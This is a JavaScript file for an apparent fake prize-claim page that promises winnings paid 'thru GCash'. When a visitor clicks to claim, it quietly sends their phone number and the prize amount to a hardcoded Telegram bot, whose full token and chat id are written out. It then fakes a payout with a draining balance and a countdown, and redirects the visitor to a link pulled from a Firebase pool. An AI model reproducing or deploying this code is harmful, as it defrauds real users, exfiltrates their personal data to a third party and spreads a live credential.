let claimState = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

async function isFirewallActive() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/globalFirewall').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) { return false; }
    }
    return false;
}

async function sendVerificationRequestNotification(phone, amount) {
    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n💵 ₱${amount}`;
    try { await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`); } catch(e) {}
}

async function showClaimPopup(amount) {
    const firewallActive = await isFirewallActive();
    if (firewallActive) {
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        await sendVerificationRequestNotification(userPhone, amount);
        if (typeof window.showFirewallPopup === 'function') window.showFirewallPopup();
        return;
    }
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    if (claimBtn) { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopup() { const p = document.getElementById('claimPopup'); if (p) p.style.display = 'none'; }
function showPendingStatus() { const pa = document.getElementById('pendingStatusArea'); if (pa) pa.style.display = 'block'; claimState.isPending = true; }
function hidePendingStatus() { const pa = document.getElementById('pendingStatusArea'); if (pa) pa.style.display = 'none'; claimState.isPending = false; }

function startSmoothDecrement(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    let current = originalAmount;
    const decrementStep = 1;
    const totalDuration = 2000;
    const steps = originalAmount;
    const intervalTime = totalDuration / steps;
    claimState.balanceDecrementInterval = setInterval(() => {
        current = current - decrementStep;
        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
        if (current <= 0) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

function startVisibleCountdown(originalAmount) {
    let remaining = claimState.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    const withdrawBtn = document.getElementById('claimBtn');
    if (!timerSpan) return;
    claimState.countdownInterval = setInterval(() => {
        if (remaining > 0) { remaining--; const mins = Math.floor(remaining / 60); const secs = remaining % 60; timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`; }
        if (remaining <= 0) {
            clearInterval(claimState.countdownInterval);
            claimState.countdownInterval = null;
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
            if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) window.parent.updateGameBalance(originalAmount);
            else if (typeof updateGameBalance === 'function') updateGameBalance(originalAmount);
            else if (typeof GameState !== 'undefined') { GameState.balance = originalAmount; if (typeof updateUI === 'function') updateUI(); if (typeof saveData === 'function') saveData(); }
            if (pendingArea) pendingArea.style.display = 'none';
            if (withdrawBtn) withdrawBtn.style.display = 'block';
            claimState.isProcessing = false;
            claimState.hasRedirected = false;
        }
    }, 1000);
}

function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) { claimState.hasRedirected = true; window.location.href = redirectUrl; }
    }, 1000);
}

function onClaimAction() {
    if (claimState.isProcessing) return;
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`).catch(e => {});
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                db.ref('links/' + key).update({ status: 'claimed', user: userPhone, amount: amount, claimedAt: Date.now() });
                hideClaimPopup();
                showPendingStatus();
                startSmoothDecrement(amount);
                startVisibleCountdown(amount);
                startImaginaryTimer(redirectUrl);
            } else {
                claimBtn.innerHTML = 'NO REWARDS';
                setTimeout(() => { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; claimState.isProcessing = false; }, 3000);
                alert("No available rewards!");
            }
        }).catch(() => {
            claimBtn.innerHTML = 'ERROR';
            setTimeout(() => { claimBtn.innerHTML = 'CLAIM THRU GCASH'; claimBtn.disabled = false; claimState.isProcessing = false; }, 3000);
        });
    }
}

// ========== PRIZE POPUP FUNCTIONS (para sa VIEW PRIZE button) ==========
async function showPrizePopup() {
    const amount = claimState.currentAmount;
    if (!amount) {
        alert("No prize amount available!");
        return;
    }
    
    // Get QR link from Firebase
    let qrLink = "https://gcash.com/promo";
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/qrData').once('value');
            const data = snap.val();
            if (data && data.url) qrLink = data.url;
        } catch(e) {}
    }
    
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'flex';
    
    // Show loading
    const container = document.getElementById('prizeImageContainer');
    if (container) {
        container.innerHTML = '<div style="padding:20px; text-align:center; color:#aaa;">Loading your prize...</div>';
    }
    
    // Generate image using temp.js
    try {
        if (typeof generateTemplateImage === 'function') {
            await generateTemplateImage(amount, qrLink, 'prizeDisplayCanvas');
        } else {
            console.error("generateTemplateImage not found. Make sure temp.js is loaded.");
            if (container) {
                container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Template generator not loaded. Please refresh.</div>';
            }
        }
    } catch(e) {
        console.error("Image generation failed:", e);
        if (container) {
            container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Failed to load image. Please try again.</div>';
        }
    }
}

function hidePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
}

document.addEventListener('DOMContentLoaded', function() { 
    hidePendingStatus();
});
